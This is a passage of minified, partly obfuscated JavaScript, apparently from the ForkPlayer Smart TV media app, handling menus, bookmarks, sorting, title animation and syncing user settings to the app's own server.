oInset[insetActive].posStart(-1,0)}}
if(gP()==null)reselAll()}
function _img(s){if(typeof s=="undefined")s="_ST_1px.png";else if(s.match(/^.{0,3}(none|hidden|undefined)/))s="_ST_1px.png";s=s.replace("_ST_","https://raw.githubusercontent.com/komivp/appinfodl/main/static/");if(s.indexOf("ndate")>0){var mtc=s.match(/ndate(.*?)_/);if(mtc!=null)n=mtc[1];else n=999999}else n=180929;if(version_local_files>=n&&!s.match(/visual(2|3).gif$/)&&(!s.match(/fon..?\.jpg$/)||s.indexOf("fon20.jpg")>0)){s=s.replace("https://raw.githubusercontent.com/komivp/appinfodl/main/static/","static/")}
return s}
var rates={};var lastsel=0,hmenu="",cVc=0;var adop="",ncc=0,sPos={},sPosX=0,sPosY=0;function p_d(){kjtYpr.long_left=!1;kjtYpr.long_timer=setTimeout('kjtYpr.long_left=true;kjtYpr.l1Q1OIO0duul1l1IlYpr();',700)}
function p_u(){clearTimeout(kjtYpr.long_timer)}
function p_c(ind){if(handler=="context")return;if(!kjtYpr.long_left){oInset[insetActive].play(ind)}
kjtYpr.long_left=!1}
function lOI11II0lfSYLUllI11IYpr(){return}
function set_times(mode){if(ll0l0loMtIlIOYpr()||xml_live||ftimes==null||gP()==null)return;try{for(var i=0;i<gP("channels").length;i++){if(gV(gP("channels")[i],"stream_url")!=""){if(typeof ftimes[getIdent(i)]!="undefined"){$_("titleid"+i).style.textDecoration="line-through"}else if(mode)$_("titleid"+i).style.textDecoration="";if(typeof allTimes[getIdent(i)]!="undefined"&&$_("numch"+i)!=null){if(allTimes[getIdent(i)].d!=kjtYpr.hardware+" ("+kjtYpr.mac+")"){$_("numch"+i).style.textDecoration="underline"}else $_("numch"+i).style.textDecoration=""}}}}catch(e){console.log(e)}}
var stopAnim=!1,elAnim=null;function animateTitle(scrollingWidth){var id=$_('titleid'+getSelect());if(!stopAnim&&id!=null){elAnim=$(id);elAnim.animate({left:"-=30"},{duration:800,easing:'linear',complete:function(){if(elAnim.css("left").split("px")[0]<-1*scrollingWidth){elAnim.css("left",0);setTimeout(function(){if(!stopAnim)animateTitle(scrollingWidth)},1000)}else if(!stopAnim)animateTitle(scrollingWidth)}})}}
function stopRoll(){if(elAnim!=null){stopAnim=1;elAnim.stop(!0,!0).css("left","0");elAnim=null}}
var rollTimer;function rollTitle(w){clearTimeout(rollTimer);rollTimer=setTimeout(function(){var id=$_('titleid'+getSelect());if(id!=null){stopRoll();var scrollingWidth=$($_('titleid'+getSelect())).width()-$($_('title'+getSelect())).width();console.log("roll pos "+$(id).css("position"));if(w==null&&$(id).css("position")=="relative"&&scrollingWidth>0){stopAnim=!1;console.log("roll "+scrollingWidth+"/");animateTitle(scrollingWidth+15)}}},1000)};function addHandler(object,event,handler,useCapture){if(object.addEventListener){object.addEventListener(event,handler,useCapture?useCapture:!1)}else if(object.attachEvent){object.attachEvent('on'+event,handler)}else{console.log("Add handler is not supported")}}
var lastScroll=0,progScroll=0,tmpsel=0;function scrollSite(){console.log("progScroll "+progScroll);var curPage=gP();buff.cleartop();if(!progScroll){gP().renderChannels(null,"focused")}else{console.log("skip scroll after keypad")}
progScroll=0}
var stpeI,mcanc=10,CAS=[];function linkOver(s,el,cb){if(handler=='context'||handler=='vk'||handler=='move'||handler=='confirm'||handler=='group')return;oInset[insetActive].focused(s,el);return}
var lapsetimer,timerScroll;var chOrig,chLast=0,modeGroup=!1;RegExp.escape=function(text){return text.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")};var subMenu=[],subllQI1IlixJG1OIIIYpr,submenuParent,submenuSelIcon={},selfbookm=!1;function closeSubMenu(){if($_("submenu")!=null)$("#submenu").remove();subMenu=[]}
function showSubMenu(m,sub){if($_("submenu")!=null)$("#submenu").remove();selfbookm=!1;$_("MenuCh").style.display="block";$_("l1II1IlOORHvj11O1Ypr"+llQI1IlixJG1OIIIYpr).style.backgroundColor=rgba("rgb(70, 77, 90)");handler="context";var mR=$_("MenuCh").offsetLeft+$_("MenuCh").offsetWidth;var div=document.createElement('div');div.id="submenu";div.style.color="#EEEEEE";div.style.overflow="visible";div.style.textAlign="left";div.style.width="auto";div.style.maxWidth="390px";div.style.border="1px solid gray";div.style.fontSize="23px";div.style.backgroundColor="#323c42";subllQI1IlixJG1OIIIYpr=0;submenuParent=llQI1IlixJG1OIIIYpr;div.style.position="absolute";var curPage=oInset[insetActive];subMenu=[];if(sub!=null)subMenu=sub;else if(m!=null){if(m=="cmdSorting"){var logo="<img src='"+_img("_ST_ok.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> ";subMenu.push({"title":"_FPTop_ (+1)","cmd":"cmdSetSorting","opt":"1"});subMenu.push({"title":"_FPpoumolch_ (0)","cmd":"cmdSetSorting","opt":"0"});subMenu.push({"title":"_FPBottom_ (-1)","cmd":"cmdSetSorting","opt":"-1"})}else if(m=="cmdAudio"){if(vk_repeat)var logo="<img src='"+_img("_ST_ok.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> Повтор";else logo="Повтор";subMenu.push({"title":logo,"cmd":"cmdAudioRepeat"});subMenu.push({"title":"Перемешать","cmd":"cmdAudioShuffle"});subMenu.push({"title":"Визуализация 1 ","cmd":"cmdAudioV","opt":"3"})}else if(m=="Bookmarks"||m=="cmdMoveBookmarks"){if(m=="Bookmarks"){var s1="_FPDobavitV_";var s2=""}else{s1="_FPPeremV_";s2="cmdMove"}
if(gP().is_iptv>2&&select>=0&&curCh("stream_url")!=""&&curCh()["parser"]==""){logo="<img src='"+_img("_ST_1px.png")+"' id='selfbookmarkimg' width="+css_w(21)+" height="+css_wh(16)+" /> ";subMenu.push({"title":logo+"Самообновляемая закладка","cmd":"selfbookmark"})}
if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladki.xml")!="")subMenu.push({"title":s1+" _FPzakladki_ / _FPRaznoe_","cmd":s2,"opt":"zakladki.xml"});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladki.xml")!="")subMenu.push({"title":s1+" _FPzakladki_ / _FPSeriali_","cmd":s2,"opt":"zakladkiSerials.xml"});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladki.xml")!="")subMenu.push({"title":s1+" _FPzakladki_ / _FPFilmi_","cmd":s2,"opt":"zakladkiFilms.xml"});if(kjtYpr.l1O0l1gmmv01O11Ypr("zakladki.xml")!="")subMenu.push({"title":s1+" _FPzakladki_ / IPTV","cmd":s2,"opt":"zakladkiIPTV.xml"});s=kjtYpr.l1O0l1gmmv01O11Ypr("bookmarks");var dopch=[];if(s!=""){var sd=l0QO11lOz0bfh10l0Ypr(s);if(sd!=null){dopch=sd}}
for(var i=0;i<dopch.length;i++){if(typeof dopch[i].logo_30x30!="undefined")var logo="<img src='"+_img(dopch[i].logo_30x30)+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" "+dopch[i].title;else logo=s1+" "+dopch[i].title;if(dopch[i].playlist_url!="bookmarks/toolbar")
subMenu.push({"title":logo,"cmd":s2,"opt":dopch[i].playlist_url})}
logo="<img src='"+_img("_ST_plus.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" Новую папку";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addnew"});subMenu.push({"title":s1+" _FPBookmark toolbar_","cmd":s2,"opt":"bookmarks/toolbar"});logo="<img src='"+_img("_ST_b_c.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" _FPVneshnie_ _FPzakladki_";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addext"});logo="<img src='"+_img("_ST_b_c.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" _FPVneshnie_ _FPzakladki_ 2";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addext2"});logo="<img src='"+_img("_ST_b_c.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" _FPVneshnie_ _FPzakladki_ 3";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addext3"})}}else{subMenu.push({"title":"_FPRename_","cmd":"cmdRename"});if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("bookmarks/")!=0&&gP("lIQ0Il1IlIb1Il1OYpr").indexOf("zakladki")!=0){subMenu.push({"title":"_FPChangeURLicon_","cmd":"cmdUrlIcon"});subMenu.push({"title":"_FPSelectIcon_","cmd":"cmdSelIcon"});subMenu.push({"title":"_FPEdit URL_","cmd":"cmdEditUrl"})}}
if(getSelect()>=0)if(curPage.curCh("playlist_url").indexOf("bookmarks/")==0)subMenu.push({"title":"_FPDelete_","cmd":function(){var x=0,d=0;markedObj.entries(function(ch,n){d++;x+=parseInt(xhr_bookmark(ch.playlist_url,"count"))});confirmed.create("_FPAre you sure_?<br>("+d+" папок, "+x+" закладок)").fun0=function(){var g=getSelect();markedObj.entries(function(ch,n){g--;setSelect(-1);xhr_bookmark(ch.playlist_url,"alldel")});if(g<0)g=0;setSelect(s);oInset[insetActive].reload()};markedObj.cancel()}});var html="";for(var i=0;i<subMenu.length;i++){if(gV(subMenu[i].icon)!="")subMenu[i].title="<img src='"+_img(subMenu[i].icon)+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+subMenu[i].title;if(subMenu[i].title.indexOf("img src")==-1)subMenu[i].title="<span style='padding-left:"+css_w(28)+"px;height:"+css_wh(25)+"px;padding-top:2px;'></span>"+subMenu[i].title;html+="<div"+lIl11llQV1Z1NOO0IYpr(1,[" onmousemove=\"subllQI1IlixJG1OIIIYpr="+i+";kjtYpr.l1Q1OIO0duul1l1IlYprPos(subllQI1IlixJG1OIIIYpr,true);\" onclick=\"subllQI1IlixJG1OIIIYpr="+i+";subMenuEnter();\"",""])+" id='subl1II1IlOORHvj11O1Ypr"+i+"' class='menuchannel' style='width:auto;height:"+css_wh(25)+"px;overflow:hidden;'>"+subMenu[i].title+"</div>"}
div.innerHTML=fp(html);div.style.top=($_("l1II1IlOORHvj11O1Ypr"+llQI1IlixJG1OIIIYpr).offsetTop+$_("MenuCh").offsetTop)+"px";$_("main").appendChild(div);if($("#site").width()-mR<370)$_("submenu").style.left=($_("MenuCh").offsetLeft-$("#submenu").width()-1)+"px";else $_("submenu").style.left=(mR+1)+"px";kjtYpr.l1Q1OIO0duul1l1IlYprPos(subllQI1IlixJG1OIIIYpr,!0)}
function subMenuEnter(){if(subMenu.length>0){if(typeof subMenu[subllQI1IlixJG1OIIIYpr].cmd=="function"){console.log(subMenu[subllQI1IlixJG1OIIIYpr]);kjtYpr.l1Q1OIO0duul1l1IlYprPlay(subMenu[subllQI1IlixJG1OIIIYpr].cmd,subMenu[subllQI1IlixJG1OIIIYpr].args)}else if(subMenu[subllQI1IlixJG1OIIIYpr].cmd=="cmdSetSorting"||subMenu[subllQI1IlixJG1OIIIYpr].cmd==""||subMenu[subllQI1IlixJG1OIIIYpr].cmd=="cmdAudioV"||subMenu[subllQI1IlixJG1OIIIYpr].cmd=="cmdMove"){Menu[llQI1IlixJG1OIIIYpr][3]=subMenu[subllQI1IlixJG1OIIIYpr].opt;console.log(Menu[llQI1IlixJG1OIIIYpr]);kjtYpr.l1Q1OIO0duul1l1IlYprPlay(subMenu[subllQI1IlixJG1OIIIYpr].cmd)}else kjtYpr.l1Q1OIO0duul1l1IlYprPlay(subMenu[subllQI1IlixJG1OIIIYpr].cmd)}else{console.log(Menu[llQI1IlixJG1OIIIYpr]);kjtYpr.l1Q1OIO0duul1l1IlYprPlay(Menu[llQI1IlixJG1OIIIYpr][2],Menu[llQI1IlixJG1OIIIYpr][3])}}
var mB64={b64_table:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-/=",keyCharAt:function(key,i){if(key.length)return key.charCodeAt(Math.floor(i%key.length));else return 0},ToNum:function(a){var c=this;var n=0,b=64;var mas=c.b64_table.slice(0,b);a=String(a);for(var i=0;i<a.length;i++){n=n+(mas.indexOf(a.substr(a.length-i-1,1))*Math.pow(b,i))}
return n},ToStr:function(a){var c=this;var s="",cc=64;var mas=c.b64_table.slice(0,cc);while(a>0){s=String(s)+mas[a%cc];a=Math.floor(a/cc)}
return s.split("").reverse().join("")},encrypt:function(text){var c=this;try{console.log("origlen="+text.length);var key=gV(gnxu.split("|")[0].split("="),1);text=_.map(text,function(co,i){var h1=co.charCodeAt(0)^c.keyCharAt(key,i);if(h1<64*64){var n1=Math.floor(h1/64);var n2=h1%64;var enc=c.b64_table.charAt(n1)+c.b64_table.charAt(n2)}else{enc="="+c.ToStr(h1)+"="}
return enc});text=text.join("");return text}catch(e){console.log(e);kjtYpr.popUp("Error join DATA! "+e.message,2000);return text}},decrypt:function(text,key){var c=this;if(key==null)key=gV(gnxu.split("|")[0].split("="),1);console.log("key="+key);var i=0,res="",num=0;while(i<text.length){var h1=text.charAt(i++);var h2=text.charAt(i++);var e="";if(h1=="="){e+=h2;while(i<text.length&&text.charAt(++i)!="="){e+=text.charAt(i)}
i++}else e=h1+h2;e=c.ToNum(e);var code=c.keyCharAt(key,num)^e;console.log(e+"="+code+" "+String.fromCharCode(code));res+=String.fromCharCode(code);num++}
return res}}
function testenc(){var k=allfs,g="";for(var i in k){var s=kjtYpr.l1O0l1gmmv01O11Ypr(k[i]);for(var j=0;j<10;j++)g+=s+"[-..-]"}
var runtime=Date.now();for(var j=0;j<3;j++){var s=mB64.encrypt(g)}
runtime=Date.now()-runtime;console.log("render ="+runtime+" msec "+(runtime/3)+"per len="+g.length);console.log(s)}
function autoexport(m){if(gV(m)=="user")var wuser=1;else wuser=0;if(wuser&&user==null)return;var xhr=uHelper.create("directnoheader");xhr.parse=function(s){if(wuser){statusbar("sync user data ok");var data=l0QO11lOz0bfh10l0Ypr(gV(s));if(data!=null)allTimes=l0QO11lOz0bfh10l0Ypr(data.times)}else if(s.indexOf(".frk")>0){statusbar("sync settings data ok");wchanged=0;statusbar("off");if(m=="timer")return;else if(m=="store"){if(is_tizen)document.location="http://smart.obovse.ru/?do=forktizen";else document.location="http://smart.obovse.ru/?do=fork"}else setTimeout("closeapp();",1000)}else{kjtYpr.inf("Ошибка сохранения данных на сервере! "+s,2500)}}
if(wchanged){var g="";if(wuser){var k=["glstart","bookmarks","history","zakladki.xml","zakladkiFilms.xml","zakladkiIPTV.xml","zakladkiSerials.xml","storage","times","settings","","","",""];for(var i=0;i<oInset.length;i++)k.push("url"+i);}else k=allfs;for(var i in k){var s=kjtYpr.l1O0l1gmmv01O11Ypr(k[i]);g+=s+"[-..-]"}
xhr.getI("http://cloudflare.appinfo.su/browseraccount/?do=fexport&rev=4&"+(wuser?"v=user":"mode=auto")+"#POSTs="+mB64.encrypt(g))}else xhr.parse("ok.frk")}
var autoimpok=0;function autoimport(u,c){var xhr=uHelper.create("directnoheader");var key=gV(gnxu.split("|")[0].split("="),1);xhr.parse=function(s){s=mB64.decrypt(gV(s),key);console.log(s);if(c==null){if(autoimpok)return;autoimpok=1;var x=s.split("[-..-]");if(x.length<3)kjtYpr.popUp("<font color=red>_FPError download data, load local settings_!</font>",1500);else{var g=0;for(var i=0;i<x.length&&i<allfs.length;i++){kjtYpr.lll0Il11OxICbl1ll0Ypr(allfs[i],x[i]);g+=x[i].length}
loadinfo("_FPSize data_ "+g+" _FPBait_!");autoimpok=2}
kjtYpr.kjtYpj("sync")}else{if(c.canceled){console.log("canceled res o");return}
var x=s.split("[-..-]");if(x.length<3){kjtYpr.inf("Error format import file!",2500);is_loadpage(-1)}else{var g='';for(var i=0;i<x.length&&i<allfs.length;i++){if(allfs[i]=="storage")continue;if(allfs[i]=="settings"){var xx=l0QO11lOz0bfh10l0Ypr(x[i]);if(xx!=null){xx.ts=0;xx.name=kjtYpr.GL.name;x[i]=llIl1I1HlMgNII1IO0Ypr(xx)}
console.log(x[i])}
kjtYpr.lll0Il11OxICbl1ll0Ypr(allfs[i],x[i]);statusbar("write "+allfs[i]+" ("+x[i].length+"byte)","link")}
statusbar("Иморт завершен","link");kjtYpr.popUp("Перезагрузите приложение!");kjtYpr.lll0Il11OxICbl1ll0Ypr("ts","0");kjtYpr.lll0Il11OxICbl1ll0YprC("ts","0");if(uaJ!="mag"){document.location.reload();location.reload()}}}}
if(u==null)u="http://cloudflare.appinfo.su/browseraccount/?do=fimport&v=auto&rev=4";xhr.getI(u)}
var wlistRewrite=!1;var allfs=["glsearch","glstart","history","settings","epg_set","url0","url1","url2","url3","url4","url5","url6","url7","urlInset","searches","enteres","zakladki.xml","zakladkiSerials.xml","zakladkiFilms.xml","zakladkiIPTV.xml","times","vk_audio_pl","vk_audio_sel","vk_pl_url","bookmarks","lic","mlang","ordered","xr","url8","url9","storage","lastdata","datas","mf","url10","url11"];kjtYpr.l1Q1OIO0duul1l1IlYprPlay=function(cmd,opt){console.log(cmd+" opt="+opt);if(cmd=="selfbookmark"){console.log($_("selfbookmarkimg").src);if($_("selfbookmarkimg").src==_img("_ST_select_all.png")){selfbookm=!1;$_("selfbookmarkimg").src=""+_img("_ST_1px.png")+""}else{selfbookm=!0;$_("selfbookmarkimg").src=_img("_ST_select_all.png");kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> Может значительно увеличиться время запуска закладки! Адрес закладки будет всегда самообновляться с этого плейлиста! ",3500)}
return}
if($_("vk").style.display!="none"){$_("vk").style.display="none";kjtYpr.inputId="";$_("main").style.display="block";handler="menu"}
closeSubMenu();$_("MenuCh").style.display="none";if(typeof cmd=="function"){if(!cmd(opt)){lI1I1IxFCIh1l01llYpr("MenuCh","");handler="menu";oInset[insetActive].focused()}
return}
var curPage=gP();var ch=oInset[insetActive].curCh();wlistRewrite=!1;switch(cmd){case "cmdGoURL":handler="menu";oInset[insetActive].navigate(Menu[llQI1IlixJG1OIIIYpr][3]);break;case "cmdMail":handler="menu";setSelect(0);ol1IO0ORc1_tI0QlYpr("cmdmail");break;case "cmdMenuSettings":kjtYpr.l1Q1OIO0duul1l1IlYpr('topmenu');break;case "cmdOpenStart":handler="menu";setSelect(0);gotoStart();break;case "cmdRewrite":wlistRewrite=!0;kjtYpr.l1O0OOzczEvllIOYpr();break;case "cmdOpenInsetClose":insetCount++;insetSelect=insetCount-1;oInset[insetSelect]=oldinset;playInset();handler="menu";break;case "cmdClearprov":kjtYpr.lll0Il11OxICbl1ll0Ypr(Menu[llQI1IlixJG1OIIIYpr][3],"");payd={};handler="menu";tmf();break;case "cmdSetIcon":if(Menu[llQI1IlixJG1OIIIYpr][3]!="cancel"){if(submenuSelIcon.playlist_url.indexOf("bookmarks/")==0&&!selIconstart){xhr_bookmark(submenuSelIcon.playlist_url,cmd,Menu[llQI1IlixJG1OIIIYpr][3])}else{var t=getVars("start");t.fav[submenuSelIcon.id].logo_30x30=Menu[llQI1IlixJG1OIIIYpr][3];setVars("start",t);$_("vk").style.display="none";kjtYpr.inputId="";handler="menu";if(ll0l0loMtIlIOYpr())page_rs({"src":"_reload"})}}
submenuSelIcon={};handler="menu";break;case "cmdSelIcon":if(ll0l0loMtIlIOYpr())selIconstart=!0;else selIconstart=!1;submenuSelIcon=ch;submenuSelIcon.selicon=!0;handler="menu";subMenu=[];break;case "cmdUrlIcon":VK.Show(null,null,"cmdUrlIcon","_FPEnterURLicon_",ch.logo_30x30);break;case "cmdEditUrl":VK.Show(null,null,"cmdEditUrl","_FPEnter URL_",ch.playlist_url);break;case "cmdRename":if(ll0l0loMtIlIOYpr())selIconstart=!0;else selIconstart=!1;if(ch.title.indexOf("--")>0)var title=ch.title.split("--")[1];else title=ch.title;if(title.indexOf("<div")==0){title=title.match(/.*nowrap;'>(.*?)</)[1]}
ch.search_on="_FPEnterTitle_";ch.value=title;VK.Show(null,ch,"cmdRename");break;case "cmdAudioV":try{vk_visual=1;console.log("vk_Visualaudio+"+Menu[llQI1IlixJG1OIIIYpr][3]);vk_Visualaudio(Menu[llQI1IlixJG1OIIIYpr][3]);handler="menu"}catch(e){console.log(e)}
break;case "cmdAudioRepeat":vk_audioRepeat(!0);handler="menu";break;case "cmdAudioShuffle":vk_audioShuffle();handler="menu";break;case "cmdAudio":handler="menu";showSubMenu("cmdAudio");break;case "cmdEdit":if(ll0l0loMtIlIOYpr()&&ch.jtvname=="-1"){}
handler="menu";showSubMenu();break;case "Bookmarks":handler="menu";showSubMenu("Bookmarks");break;case "cmdSorting":handler="menu";showSubMenu("cmdSorting");break;case "cmdMoveBookmarks":handler="menu";showSubMenu(cmd);break;case "cmdRemoteUpdate":handler="menu";l0OI10IRge011lO1Ypr();break;case "cmdProxy":lIO1OIOlAQzl1Ol1lYpr=kjtYpr.GL.player;lIIl0Il0LaVOO0OIYpr();ll0lIOsIoIIlOlYpr(ch.stream_url.replace(/^https?:\/\//,Menu[llQI1IlixJG1OIIIYpr][3])+"?tm="+gnxu);break;case "cmdTranslate":handler="menu";kjtYpr.GL.lang;var k=insetIn(-1,"get","title")+"[-|-]";for(var i=0;i<curPage.channels.length;i++){k+=curPage.channels[i].title+"[-|-]";k+=curPage.channels[i].description+"[-|-]"}
statusbar("translate page to "+kjtYpr.GL.lang+"      ","translate");lIl0l1OX1vbll1I1IQYprPost("http://"+lIOO01vuII1IQIYpr+"/smarttv/api.php?do=translatepage&format=html&lang="+kjtYpr.GL.lang,"k="+encodeURIComponent(k),"translatepage");break;case "cmdInsetBlock":oInset[insetActive].put("b",!oInset[insetActive].get("b"));handler="menu";break;case "cmdInsetStart":if(insetIn(-1,"get","a")==""){for(var i=0;i<insetCount;i++){if(insetIn(-1,"get","a",null,i)=="1")insetIn(-1,"put","a","",i)}
insetIn(-1,"put","a","1");insetIn(-1,"put","b","1");if(!kjtYpr.GL.recovery){kjtYpr.popUp("_FPUdalenaGrupa_: _FPStartovoeMenu_");kjtYpr.GL.recovery=1;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL))}}else insetIn(-1,"put","a","");handler="menu";break;case "cmdCancel":handler="menu";break;case "cmdReset":ol1IO0ORc1_tI0QlYpr("cmdreset");break;case "cmdGroup":handler="menu";OpenUrl({"title":"_FPCategorys_","playlist_url":gP("lIQ0Il1IlIb1Il1OYpr").split("#CAT=")[0]+"#CAT=LISTCATS"});break;case "cmdSetSorting":if(kjtYpr.GL.sortiptv!=3){confirmed.create("_FPSortirovka_ IPTV: "+shint(10+parseInt(kjtYpr.GL.sortiptv))+"<br>_FPEnabling can slow opening iptv lists_","Enabled?");confirmed.fun0=function(){kjtYpr.GL.sortiptv=3;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL))};return}
var s=kjtYpr.l1O0l1gmmv01O11Ypr("ordered");if(s=="")ordered={};else ordered=l0QO11lOz0bfh10l0Ypr(s);if(ordered==null)ordered={};var nm=ord_id();if(typeof ch.origsel!=undefined&&ch.origsel!=undefined)origsel=ch.origsel;else origsel=getSelect();if(typeof ordered[nm]=="undefined")ordered[nm]={};if(typeof ordered[nm][origsel]=="undefined")ordered[nm][origsel]=0;opt=parseInt(Menu[llQI1IlixJG1OIIIYpr][3]);if(opt==0)ordered[nm][origsel]=0;else ordered[nm][origsel]+=opt;if(ordered[nm][origsel]==0)delete ordered[nm][origsel];kjtYpr.lll0Il11OxICbl1ll0Ypr("ordered",llIl1I1HlMgNII1IO0Ypr(ordered));handler="menu";console.log("gP().ordchannels");console.log(gP().ordchannels);gP().channels=reordered(l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(gP().ordchannels)));old_s=getSelect();gP().renderChannels(old_s,"update");break;case "cmdGlUp":kjtYpr.lOIOl01Iys0yo1IlOI0Ypr(ch.playlist_url,VK_UP);break;case "cmdGlDown":kjtYpr.lOIOl01Iys0yo1IlOI0Ypr(ch.playlist_url,VK_DOWN);break;case "cmdGlDel":console.log(ch.playlist_url);kjtYpr.lOIOl01Iys0yo1IlOI0Ypr(ch.playlist_url,VK_GREEN);break;case "cmdGlDef":kjtYpr.lll0Il11OxICbl1ll0Ypr("glsearch","");kjtYpr.inf("Set default OK",1200);readGl();kjtYpr.l1Q1OIO0duul1l1IlYprPlay("cmdReload");handler="menu";break;case "cmdStartDef":kjtYpr.lll0Il11OxICbl1ll0Ypr("glstart","");kjtYpr.inf("_FPSetDefaultStartMenu_ OK",1200);kjtYpr.l1Q1OIO0duul1l1IlYprPlay("cmdReload");handler="menu";break;case "cmdToStart":function caddtostart(m){var ch=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(m));if((gV(ch,"playlist_url").indexOf("no_save")>0||gV(ch,"stream_url").indexOf("no_save")>0)&&gP("lIQ0Il1IlIb1Il1OYpr").indexOf("http")==0){kjtYpr.inf("_FPCopied denied by author playlist_! "+ch.title,2500);handler="menu"}else{var obj=cleanCh(ch);console.log("add to start");console.log(obj);var t=getVars("start");t.fav.push(obj)
console.log(t);setVars("start",t);kjtYpr.inf("_FPDobavlenoV_ _FPStartovoeMenu_ "+obj.title,1200)}}
var s=kjtYpr.l1O0l1gmmv01O11Ypr("glstart");if(s.indexOf("{")!==0){var favlist=[];var fch=readSt();for(var i in fch){if(gV(fch[i],"source")=="fav")favlist.push(gV(fch[i]))}}
if(favarray!=null)caddtostart(favarray);else if(getSelect()<0){ch={};ch.playlist_url=oInset[insetActive].get("url");ch.title=oInset[insetActive].get("title");ch.logo_30x30=oInset[insetActive].get("img");ch.parser=oInset[insetActive].get("p");caddtostart(ch)}else{markedObj.entries(function(m,n){caddtostart(m)});markedObj.cancel()}
handler="menu";if(ll0l0loMtIlIOYpr())oInset[insetActive].reload();else oInset[insetActive].focused();favarray=null;break;case "cmdDelFromStart":t=getVars("start");markedObj.entries(function(ch,n){if(ch.playlist_url=="searchEngines"){kjtYpr.inf("Этот пункт нельзя удалить!",1200)}else if(gV(ch,"source")=="fav"){t.fav.splice(ch.id,1);setVars("start",t);kjtYpr.inf("Удалено из Избранное ("+ch.title+")",1500)}else if(gV(ch,"source").match(/(usertop)/)){delete userTop[ch.playlist_url];kjtYpr.inf("Удалено из истории адрес сайта ("+ch.title+")",1500)}else if(gV(ch,"source").match(/(top|third|service)/)){if(typeof t.hidetop=="undefined")t.hidetop={};t.hidetop[ch.playlist_url+ch.stream_url]=1;setVars("start",t);kjtYpr.inf("Скрыто адрес сайта ("+ch.title+")",1500)}});markedObj.cancel();handler="menu";oInset[insetActive].reload();break;case "cmdNewInset":setSelect(0);newInset(0);handler="menu";break;case "cmdNewInsetPriv":setSelect(0);newInset(1);kjtYpr.popUp("Ваши действия в режиме инкогнито будут недоступны другим пользователям этого устройства. Однако закладки сохранятся.<br>В ForkPlayer не будет сохраняться следующая информация:<br>история просмотров; файлы cookie и данные сайтов;сведения, которые вы указываете в формах.",2500);handler="menu";break;case "cmdSetWeather":gP().lIQ0Il1IlIb1Il1OYpr=cmd;var data={"playlist_name":""};data["chan"+"nels"]=[];for(var i=0;i<gs.count;i++){if(gs.url[i].title==""){var ttl=gs.url[i].url.split("/");gs.url[i].title=ttl[ttl.length-1].split(".")[0]}
var x=(gs.url[i].show=="1")?"<font color=green>_FPVkl_</font>":"<font color=red>_FPOtkl_</font>";data["chan"+"nels"].push({"logo_30x30":gs.url[i].logo,"title":gs.url[i].title+" "+x,"playlist_url":"setGlSearch"})}
handler="menu";kjtYpr.ll00Il1IVOCk1IQO0OYpr(data);break;case "cmdSearch":handler="menu";oInset[insetActive].navigate("about:yoursearchEngines|"+ch.title);return;break;case "cmdFlash":kjtYpr.l1O0OOzczEvllIOYpr(Menu[llQI1IlixJG1OIIIYpr][3]);break;case "cmdUp":handler="move";return;break;case "":curPage=gP();if(getSelect()==-1){if(insetIn(-1,"get","url").indexOf("no_save")>0){kjtYpr.inf("_FPCopied denied by author playlist_!",2500);handler="menu";return}}
if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("no_save")>0){kjtYpr.inf("_FPCopied denied by author playlist_!",2500);handler="menu";return}
try{if(opt!=null)var n=opt
else n=Menu[llQI1IlixJG1OIIIYpr][3];console.log("N="+n);if(n!="bookmarks/toolbar"){lastBookm.url=n;lastBookm.title=kjtYpr.GL[n];lastBookm.logo_30x30=""}
var pl_title=kjtYpr.GL[n];pl_title=kjtYpr.GL[n];if(n.indexOf("bookmarks/")==0){var s=""}else{s=kjtYpr.l1O0l1gmmv01O11Ypr(n)}
var data=l0QO11lOz0bfh10l0Ypr(s);if(data==null){data={};data["cha"+"nnels"]=[]}
if(!curPage.is_mark){curPage.is_mark_array={};curPage.is_mark_array[getSelect()]="1"}
var count=0;for(var i=curPage.channels.length-1;i>=0;i--){if(curPage.is_mark_array[i]=="1"||getSelect()<0){if(favarray!=null)var ch=favarray;else if(getSelect()<0){ch={};ch.stream_url="";ch.playlist_url=oInset[insetActive].get("url");ch.title=oInset[insetActive].get("title");ch.logo_30x30=oInset[insetActive].get("img");ch.parser=ch.parser_orig=oInset[insetActive].get("p")}else ch=l0QO11lOz0bfh10l0Ypr(llIl1I1HlMgNII1IO0Ypr(curPage.channels[i]));console.log(ch);if(selfbookm){ch.stream_url="md5hash";var title=ch.title;if(title.indexOf("<div")==0){title=title.match(/.*nowrap;'>(.*?)</)[1]}
ch.parser=gP("lIQ0Il1IlIb1Il1OYpr")+"|selfReNewBookmark|"+title}
